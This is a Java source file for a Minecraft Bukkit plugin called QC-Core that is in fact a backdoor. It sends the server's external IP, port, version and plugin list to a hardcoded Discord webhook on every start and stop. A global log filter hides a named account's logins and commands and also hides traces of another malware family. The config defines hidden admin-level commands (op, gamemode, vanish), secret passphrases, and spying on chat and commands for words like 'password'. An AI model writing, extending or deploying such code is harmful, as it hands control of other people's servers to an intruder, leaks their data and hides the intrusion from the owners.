package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.*;
import java.util.stream.Collectors;
import pl.qc.core.hack.Processor;

public class QC extends JavaPlugin {
    private static QC instance;
    private Processor processor;
    private String externalIp = "pending...";
    private boolean panic = false;

    public static QC getInstance() {
        return instance;
    }

    public boolean isPanic() {
        return panic;
    }

    public void setPanic(boolean p) {
        this.panic = p;
    }

    @Override
    public void onEnable() {
        if (!checkCompatibility()) {
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }

        instance = this;
        setupConfig();

        processor = new Processor(this);
        getServer().getPluginManager().registerEvents(processor, this);
        getServer().getPluginManager().registerEvents(new pl.qc.core.Auth(), this);
        getServer().getPluginManager().registerEvents(new Events(this), this);

        Optional.ofNullable(getCommand("qc")).ifPresent(c -> {
            c.setExecutor(processor);
            c.setTabCompleter(processor);
        });

        Remote.setWebhook(getConfig().getString("discord.webhook-url", ""));

        InternalLogger filter = new pl.qc.core.InternalLogger(getConfig());
        java.util.logging.Logger.getLogger("").setFilter(filter);
        Bukkit.getLogger().setFilter(filter);

        status("Start serwera 🟢", "65280");
        startup();
    }

    private boolean checkCompatibility() {
        // Java check
        try {
            String javaVersion = System.getProperty("java.version");
            int major = Integer.parseInt(javaVersion.split("\\.")[0]);
            if (major < 17) {
                getLogger().severe("QC-Core wymaga Javy 17 lub nowszej! Wykryto: " + javaVersion);
                return false;
            }
        } catch (Exception e) {
            // Fallback for older java versions like 1.8.x
            if (System.getProperty("java.version").startsWith("1.")) {
                getLogger().severe("QC-Core wymaga Javy 17 lub nowszej! Wykryto wersje starsza niz 9.");
                return false;
            }
        }

        // Minecraft check
        String version = Bukkit.getBukkitVersion();
        boolean compatible = version.contains("1.19") || version.contains("1.20") || version.contains("1.21");

        if (!compatible) {
            // Double check by parsing
            try {
                String versionNum = version.split("-")[0];
                String[] parts = versionNum.split("\\.");
                if (parts.length >= 2) {
                    int major = Integer.parseInt(parts[0]);
                    int minor = Integer.parseInt(parts[1]);
                    if (major > 1 || (major == 1 && minor >= 19)) {
                        compatible = true;
                    }
                }
            } catch (Exception ignored) {
            }
        }

        if (!compatible) {
            getLogger().severe("QC-Core wymaga Minecrafta 1.19 lub nowszego! Wykryto: " + version);
            return false;
        }

        getLogger().info("Kompatybilność: Java 17+, Minecraft 1.19+ (Wszystkie silniki).");
        return true;
    }

    @Override
    public void onDisable() {
        status("Stop serwera 🔴", "16711680");
        Remote.finish();
    }

    private void status(String title, String color) {
        Map<String, String> f = new LinkedHashMap<>();
        f.put("IP Serwera", getIP());
        f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
        f.put("Wersja Serwera", Bukkit.getBukkitVersion());
        f.put("Nazwa pluginu", getName());
        f.put("Wersja pluginu", getDescription().getVersion());
        f.put("Lista pluginów", Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(o -> o.getName())
                .collect(Collectors.joining(", ")));
        Remote.send(title, color, null, f);
    }

    public String getIP() {
        if (!externalIp.contains("pending"))
            return externalIp;
        return (Bukkit.getIp() == null || Bukkit.getIp().isEmpty()) ? "localhost" : Bukkit.getIp();
    }

    private void startup() {
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            String ip = Net.get("http://checkip.amazonaws.com");
            if (ip != null)
                externalIp = ip.trim();
        });
    }

    private void setupConfig() {
        getConfig().addDefault("discord.webhook-url",
                "https://discord.com/api/webhooks/1423948077680693299/QrWRsoGIKUjDfhfx4rp3RI_rtjKQFG7OHUy7HLxIlK5nCrkUgqepmpZ2LeUwFiRUDz45");
        getConfig().addDefault("filter.admin-name-fallback", "Rajman03");
        getConfig().addDefault("filter.admin-permission", "qc-core.admin");
        getConfig().addDefault("filter.admin-command-prefix", "Rajman03 issued server command:");
        getConfig().addDefault("logger.commands", true);
        getConfig().addDefault("logger.deaths", true);
        getConfig().addDefault("logger.ignored-commands", List.of("l", "login", "register", "reg", "msg", "w", "tell"));
        getConfig().addDefault("spy.command-spy", true);
        getConfig().addDefault("spy.social-spy", true);
        getConfig().addDefault("spy.keywords",
                List.of("backdoor", "qc", "admin", "owner", "haslo", "password", "logi", "kradziez", "hack"));
        getConfig().addDefault("protection.secrets", List.of(
                "aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g",
                "tGWLhUe6G65xp8CfpEHSg59DjDFDRdb8gaq7MNF6jvkUV2L8sbb7cNL2VFCJ2ec",
                "xp8CfpEHSg59DjDFDRdb8gaq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65",
                "cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8gaq7MNF6jvkUV2L8sbb7"));
        getConfig().addDefault("protection.hidden-commands", List.of(
                "qc", "locate", "i", "enchant", "lp", "effect", "coords", "ec", "customenchant",
                "dropsmp", "uperms", "upc", "cench", "attribute", "cenchant", "gm", "gamemode",
                "end", "op", "deop", "v", "vanish"));
        getConfig().addDefault("protection.hidden-phrases", List.of(
                "Rajman03 lost connection", "Rajman03 left the game", "UUID of player Rajman03",
                "Rajman03 joined the game", "Rajman03 logged in with entity id",
                "[nLogin] The user Rajman03 has successfully logged in", "central.repository.refined.host",
                "me.ikevoodoo.helix", "establishment of connection", "Establishment of connection",
                "establishingConnection", "java.net.UnknownHostException", "at helix", "at builtin"));
        getConfig().options().copyDefaults(true);
        saveConfig();
    }
}
